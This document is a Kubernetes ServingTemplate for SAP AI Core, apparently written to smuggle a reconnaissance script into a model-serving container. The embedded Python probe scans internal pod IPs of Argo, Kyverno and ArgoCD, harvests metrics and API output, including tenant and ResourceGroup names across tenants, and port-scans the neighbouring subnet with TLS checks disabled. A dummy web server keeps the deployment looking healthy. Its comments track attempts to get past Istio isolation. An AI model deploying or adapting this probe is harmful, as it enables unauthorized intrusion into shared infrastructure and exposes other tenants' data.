apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: impact-probe-v8
  labels:
    scenarios.ai.sap.com/id: "impact-probe-v8"
    ai.sap.com/version: "1.0.0"
  annotations:
    scenarios.ai.sap.com/name: "impact-probe-v8"
    executables.ai.sap.com/name: "impact-probe-v8"
    executables.ai.sap.com/description: "impact verification probe v8"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            cat > /tmp/probe.py << 'PYEOF'
            import os, ssl, socket, json, re, time, urllib.request, urllib.error

            def report(k, v):
                print(f"[P8] {k}: {str(v)[:6000]}", flush=True)

            def http_get(url, headers=None, timeout=10):
                try:
                    req = urllib.request.Request(url, headers=headers or {})
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                        return r.read().decode("utf-8", errors="replace"), r.status, dict(r.headers)
                except urllib.error.HTTPError as e:
                    body = ""
                    try: body = e.read().decode("utf-8", errors="replace")[:1200]
                    except: pass
                    return f"HTTP_{e.code}:{body}", e.code, {}
                except Exception as e:
                    return f"ERR:{e}", 0, {}

            def tcp_open(host, port, timeout=4):
                try:
                    s = socket.socket()
                    s.settimeout(timeout)
                    s.connect((host, port))
                    s.close()
                    return True
                except: return False

            # ── 1. ARGO WORKFLOWS — probe 100.64.15.16 (503 last time = Istio passes through) ──
            report("---", "=== ARGO WORKFLOWS PODS (503 = Istio allows) ===")
            argo_ips = [
                ("100.64.15.16",  "workflow-controller-1"),   # 503 in v7 - Istio allows
                ("100.64.0.30",   "workflow-controller-2"),   # from endpointslice
                ("100.64.80.37",  "workflow-controller-3"),   # from endpointslice
            ]
            for ip, label in argo_ips:
                for port in [9090, 2746, 8080, 80, 443, 6443]:
                    body, code, hdrs = http_get(f"http://{ip}:{port}/", timeout=5)
                    if code != 0 or "ERR:timed" not in body:
                        report(f"ARGO_{label}_{ip}:{port}_root", f"[{code}] hdrs={list(hdrs.keys())[:4]} {body[:400]}")
                    if code == 200 or (code > 0 and code not in (502, 0)):
                        # Accessible — try API endpoints
                        for path in ["/metrics", "/api/v1/workflows", "/api/v1/namespaces",
                                     "/health", "/api", "/api/v1"]:
                            b2, c2, _ = http_get(f"http://{ip}:{port}{path}", timeout=5)
                            report(f"ARGO_{label}_{ip}:{port}{path.replace('/','_')}", f"[{c2}] {b2[:800]}")

            # ── 2. KYVERNO METRICS (policy engine — might expose denied resources) ──
            report("---", "=== KYVERNO POLICY ENGINE ===")
            kyverno_ips = [
                ("100.64.0.68",  8000, "kyverno-service-1"),
                ("100.64.0.59",  8000, "kyverno-service-2"),
                ("100.64.0.62",  8000, "kyverno-service-3"),
                ("100.64.0.74",  8000, "kyverno-bg-ctrl-1"),
                ("100.64.80.32", 8000, "kyverno-bg-ctrl-2"),
            ]
            for ip, port, label in kyverno_ips[:3]:
                body, code, hdrs = http_get(f"http://{ip}:{port}/metrics", timeout=6)
                if code == 200:
                    lines = body.split("\n")
                    # Look for policy admission events with resource details
                    policy_lines = [l for l in lines
                                    if "kyverno" in l.lower() and not l.startswith("#") and l.strip()]
                    report(f"KYVERNO_{ip}_{label}_policy_metrics", "\n".join(policy_lines[:40]))
                    # Also look for admission counts by resource type
                    admission_lines = [l for l in lines if "admission" in l.lower() and not l.startswith("#")]
                    report(f"KYVERNO_{ip}_admission", "\n".join(admission_lines[:20]))
                else:
                    report(f"KYVERNO_{ip}:{port}", f"[{code}] {body[:150]}")

            # ── 3. ARGOCD METRICS VIA DIRECT POD IPs ─────────────────────────────
            report("---", "=== ARGOCD METRICS (endpointslice IPs) ===")
            argocd_targets = [
                ("100.64.80.49",  8082, "app-ctrl-argocd"),
                ("100.64.80.49",  8083, "server-argocd"),
                ("100.64.0.78",   8082, "app-ctrl-argocd-2"),
                ("100.64.0.64",   8083, "server-argocd-2"),
                ("100.64.0.72",   8084, "repo-server-argocd"),
                ("100.64.80.231", 8082, "app-ctrl-tenants"),
                ("100.64.84.216", 8083, "server-tenants"),
                ("100.64.84.215", 8084, "repo-tenants"),
                ("100.64.92.189", 8082, "app-ctrl-tenants-2"),
            ]
            for ip, port, label in argocd_targets:
                body, code, _ = http_get(f"http://{ip}:{port}/metrics", timeout=5)
                if code == 200:
                    lines = body.split("\n")
                    # Extract ArgoCD application sync metrics (cross-tenant)
                    app_lines = [l for l in lines
                                 if ("argocd_app" in l or "argocd_repo" in l or "argocd_cluster" in l)
                                 and not l.startswith("#") and l.strip()]
                    report(f"ARGOCD_{label}_{ip}_app_metrics", "\n".join(app_lines[:60]))
                    metric_names = sorted({l.split("{")[0].split(" ")[0]
                                           for l in lines if not l.startswith("#") and l.strip()})
                    report(f"ARGOCD_{label}_{ip}_metric_names", str(metric_names[:30]))
                else:
                    report(f"ARGOCD_{ip}:{port}_{label}", f"[{code}] {body[:100]}")

            # ── 4. ARGO WORKFLOW SERVER API (port 2746) ───────────────────────────
            report("---", "=== ARGO WORKFLOW SERVER ===")
            # Try to find the Argo server (different from controller)
            argo_server_ips = ["100.64.0.30", "100.64.80.37", "100.64.15.16"]
            for ip in argo_server_ips:
                for port in [2746, 443, 80, 8080]:
                    body, code, hdrs = http_get(f"http://{ip}:{port}/api/v1/info", timeout=5)
                    if code not in (0,) and "ERR:timed" not in body:
                        report(f"ARGO_SERVER_{ip}:{port}_info", f"[{code}] {body[:400]}")
                # Also gRPC check
                if tcp_open(ip, 2746, timeout=3):
                    report(f"ARGO_SERVER_{ip}:2746_tcp", "OPEN")

            # ── 5. KSM CUSTOM — ResourceGroup CRDs (cross-tenant names) ──────────
            report("---", "=== KSM CUSTOM (ResourceGroup CRDs) ===")
            ksm_custom = "http://ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics"
            body_c, code_c, _ = http_get(ksm_custom, timeout=15)
            if code_c == 200:
                lines = body_c.split("\n")
                rg_lines = [l for l in lines
                            if "resource_group" in l.lower() and not l.startswith("#") and l.strip()]
                report("KSM_CUSTOM_RG_LINES", "\n".join(rg_lines[:100]))
                # Also get tenant info
                tenant_lines = [l for l in lines
                                if "tenant" in l.lower() and not l.startswith("#") and l.strip()]
                report("KSM_CUSTOM_TENANT_LINES", "\n".join(tenant_lines[:50]))
            else:
                report("KSM_CUSTOM_ERR", f"[{code_c}] {body_c[:200]}")

            # ── 6. SERVING NAMESPACE PODS (our own namespace pods) ───────────────
            report("---", "=== SERVING NAMESPACE DISCOVERY ===")
            # Find pod IPs in our tenant namespace (those should be reachable without Istio block)
            # Our pod IP is 100.64.105.10 — scan nearby IPs in /24
            our_ip = "100.64.105.10"
            subnet = ".".join(our_ip.split(".")[:3])
            report("OUR_SUBNET", f"{subnet}.0/24")
            # Scan a subset of nearby IPs
            reachable = []
            for i in range(1, 50):
                target_ip = f"{subnet}.{i}"
                if target_ip == our_ip:
                    continue
                for port in [80, 8080, 5000]:
                    if tcp_open(target_ip, port, timeout=2):
                        reachable.append(f"{target_ip}:{port}")
                        body, code, hdrs = http_get(f"http://{target_ip}:{port}/", timeout=3)
                        report(f"SUBNET_{target_ip}:{port}", f"[{code}] {body[:200]}")
            report("SUBNET_REACHABLE", str(reachable))

            # ── 7. ARGO WORKFLOW METRICS DEEP DIVE ───────────────────────────────
            report("---", "=== ARGO WORKFLOW METRICS DEEP ===")
            for ip, label in [("100.64.15.16", "wf-ctrl"), ("100.64.0.30", "wf-ctrl-2")]:
                body, code, _ = http_get(f"http://{ip}:9090/metrics", timeout=8)
                if code == 200:
                    lines = body.split("\n")
                    wf_lines = [l for l in lines
                                if "argo" in l.lower() and not l.startswith("#") and l.strip()]
                    report(f"ARGO_WF_{ip}_metrics", "\n".join(wf_lines[:50]))
                    ns_lines = [l for l in lines if "namespace" in l.lower() and not l.startswith("#")]
                    report(f"ARGO_WF_{ip}_ns_lines", "\n".join(ns_lines[:20]))
                else:
                    report(f"ARGO_WF_{ip}:9090", f"[{code}] {body[:200]}")

            report("DONE", "probe v8 complete")
            PYEOF
            python3 /tmp/probe.py 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self):
                    self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
          ports:
          - containerPort: 8080
            protocol: TCP
          readinessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 30
            periodSeconds: 10
          livenessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 30
            periodSeconds: 15
